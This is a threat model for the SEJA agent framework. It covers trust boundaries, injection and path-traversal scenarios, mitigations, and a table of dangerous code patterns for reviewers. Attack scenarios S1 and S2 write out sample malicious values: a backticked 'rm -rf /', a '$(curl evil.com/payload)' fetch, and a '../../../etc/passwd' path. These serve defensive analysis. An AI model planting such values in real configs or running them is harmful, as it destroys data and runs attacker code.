# SEJA Framework Threat Model

Lightweight threat model for the SEJA agent framework. Uses STRIDE-lite categories where applicable.

## Trust Boundaries

| Boundary | Inside (trusted) | Outside (untrusted) |
|---|---|---|
| B1 -- Conventions file | Framework code | User-authored `conventions.md` values |
| B2 -- Generated scripts | Reviewed & committed scripts | Freshly generated script output |
| B3 -- Agent subprompts | Skill SKILL.md definitions | Runtime user arguments |
| B4 -- File system | REPO_ROOT subtree | Paths outside REPO_ROOT |
| B5 -- Shell execution | Python subprocess calls with fixed args | Interpolated or user-supplied commands |

## Injection Vectors

| Vector | STRIDE | Severity | Likelihood | Mitigation | Status |
|---|---|---|---|---|---|
| V1 -- Shell metacharacters in conventions values | Tampering | High | Low | `_SHELL_INJECTION_RE` rejects backticks, `$(`, `$((` | Enforced |
| V2 -- Circular/missing `${var}` references | Denial of Service | Low | Medium | `_MAX_RESOLVE_PASSES=10` cap; post-resolve warning | Enforced |
| V3 -- Path traversal via `get_path()` | Information Disclosure | Medium | Low | `resolve()` + `relative_to(REPO_ROOT)` containment check | Enforced |
| V4 -- Unreviewed generated scripts | Elevation of Privilege | High | Medium | General guideline: display full script contents and request user confirmation before writing any generated script to disk | Enforced |
| V5 -- Prompt injection via user arguments | Spoofing | Medium | Medium | Skills receive arguments through structured frontmatter; no direct shell pass-through | Partial |
| V6 -- Malicious conventions.md in cloned repo | Tampering | Medium | Low | Shell-injection and path-traversal guards in `project_config.py` | Enforced |

## Attack Scenarios

### S1 -- Poisoned conventions.md (V1, V6)

An attacker contributes a conventions.md containing a value like `` `rm -rf /` `` or `$(curl evil.com/payload)`. When a helper script calls `get()` and interpolates the result into a shell command, the payload executes.

**Mitigation**: `_SHELL_INJECTION_RE` drops any value containing backticks, `$(`, or `$((` at parse time, before the value enters the resolved config dict.

### S2 -- Path escape (V3)

A conventions variable is set to `../../../etc/passwd`. A script using `get_path()` would resolve it outside REPO_ROOT, potentially reading or writing sensitive files.

**Mitigation**: `get_path()` resolves the candidate path and verifies it is contained within `REPO_ROOT` using `Path.relative_to()`. Non-contained paths return `None` with a stderr warning.

### S3 -- Unreviewed script execution (V4)

Any agent-generated Python script could contain hallucinated or malicious code. If written to disk without review and then executed, it could damage the project.

**Mitigation**: General guideline -- when generating executable scripts (via any skill or direct conversation), the agent must display the full script contents to the user and request explicit confirmation before writing the file to disk.

### S4 -- Variable resolution bomb (V2)

Circular references like `a=${b}`, `b=${a}` cause the resolver to loop. With no cap, this would hang the process.

**Mitigation**: `_MAX_RESOLVE_PASSES=10` ensures termination. Unresolved references after exhaustion trigger a warning.

## Current Mitigations Summary

| Component | Guard | Added |
|---|---|---|
| `project_config._parse_config()` | Shell-injection regex filter | plan-000117 |
| `project_config._parse_config()` | Unresolved-var warning after max passes | plan-000117 |
| `project_config.get_path()` | Path containment within REPO_ROOT | plan-000117 |
| General guideline (all script generation) | Mandatory user confirmation before write | plan-000117, plan-000152 |
| `_MAX_RESOLVE_PASSES` | Iteration cap (10) for variable resolution | Original |

## Generated Code Vulnerability Patterns

Enumerated patterns that agents and reviewers must check when generating or reviewing application code. Organized by category. Each pattern includes dangerous substrings to match, applicable file types, safe alternatives, and severity.

This section fulfills Recommended Future Hardening #2 (see below). The code-reviewer agent (`/.claude/agents/code-reviewer.md`) uses these patterns for deterministic pre-scan before perspective evaluation.

### Injection

| Pattern | Language | Dangerous Substrings | Safe Alternative | Severity |
|---------|----------|---------------------|------------------|----------|
| `child_process_exec` | JS/TS | `child_process.exec`, `exec(`, `execSync(` | Use `execFile()` or `execFileSync()` -- prevents shell injection by not invoking a shell | HIGH |
| `eval_injection` | JS/TS | `eval(` | Use `JSON.parse()` for data, or alternative design patterns | HIGH |
| `new_function_injection` | JS/TS | `new Function` | Avoid dynamic code evaluation; use static alternatives | HIGH |
| `os_system_injection` | Python | `os.system`, `from os import system` | Use `subprocess.run()` with a list of arguments (no `shell=True`) | HIGH |
| `subprocess_shell` | Python | `subprocess.call(`, `subprocess.run(`, `subprocess.Popen(` with `shell=True` | Use `subprocess.run([cmd, arg1, arg2])` with argument list, never `shell=True` with user input | HIGH |
| `sql_string_concat` | Any | String concatenation or f-strings building SQL queries | Use parameterized queries / prepared statements | HIGH |
| `github_actions_workflow` | YAML (.github/workflows/) | `${{ github.event.issue.title }}`, `${{ github.event.pull_request.body }}` etc. in `run:` blocks | Use `env:` block with environment variables instead of direct interpolation | HIGH |

### Cross-Site Scripting (XSS)

| Pattern | Language | Dangerous Substrings | Safe Alternative | Severity |
|---------|----------|---------------------|------------------|----------|
| `react_dangerously_set_html` | JSX/TSX | `dangerouslySetInnerHTML` | Sanitize with DOMPurify, or use safe React components | HIGH |
| `document_write_xss` | JS/TS | `document.write` | Use `createElement()` and `appendChild()` | MEDIUM |
| `innerHTML_xss` | JS/TS | `.innerHTML =`, `.innerHTML=` | Use `textContent` for plain text, or sanitize HTML with DOMPurify | HIGH |
| `jinja2_autoescape_off` | Python (Jinja2) | `autoescape=False`, `Markup(` with user input | Keep `autoescape=True` (Flask default); use `|safe` filter only on trusted content | HIGH |

### Deserialization

| Pattern | Language | Dangerous Substrings | Safe Alternative | Severity |
|---------|----------|---------------------|------------------|----------|
| `pickle_deserialization` | Python | `pickle.load`, `pickle.loads`, `import pickle` | Use `json` or other safe serialization formats for untrusted data | HIGH |
| `yaml_unsafe_load` | Python | `yaml.load(` without `Loader=SafeLoader` | Use `yaml.safe_load()` or `yaml.load(data, Loader=SafeLoader)` | HIGH |
| `java_deserialization` | Java | `ObjectInputStream`, `readObject()` | Use JSON/protobuf; if Java serialization is required, use serialization filters | HIGH |

### Template Injection

| Pattern | Language | Dangerous Substrings | Safe Alternative | Severity |
|---------|----------|---------------------|------------------|----------|
| `ssti` | Python/JS | `render_template_string(` with user input, `Template(user_input)` | Never pass user input as the template itself; use template variables instead | HIGH |

## Complementary Tools

Anthropic's official [`security-guidance` Claude Code plugin](https://github.com/anthropics/claude-code/tree/main/plugins/security-guidance) provides **pre-write interception** for 9 of the patterns above via a PreToolUse hook that fires on Edit/Write/MultiEdit tool calls. SEJA's approach provides **post-write context-aware review** via the code-reviewer agent and SEC perspective.

For defense-in-depth on application codebases, install both:
- The `security-guidance` plugin catches patterns deterministically before code hits disk (zero-miss for covered patterns, but cannot distinguish safe from unsafe uses)
- SEJA's code reviewer performs contextual triage during review (can distinguish test files from production code, intentional from accidental uses)

The two approaches operate at different layers and are complementary, not redundant. See advisory-000207 for the full evaluation.

## Recommended Future Hardening

1. **Allowlist for conventions values**: Instead of blocklisting shell metacharacters, define an allowlist regex (alphanumeric, hyphens, slashes, dots, commas) for convention values.
2. ~~**Content Security Policy for generated scripts**: Lint generated scripts for dangerous imports (`os.system`, `subprocess.Popen` with `shell=True`) before presenting to the user.~~ **Fulfilled** -- see "Generated Code Vulnerability Patterns" section above (plan-000209, advisory-000207).
3. **Subagent argument sanitization**: Add a shared sanitization step in `/pre-skill` that validates user arguments against type-specific patterns.
4. **Audit logging**: Log all rejected values and path escapes to a persistent audit file for post-incident analysis.
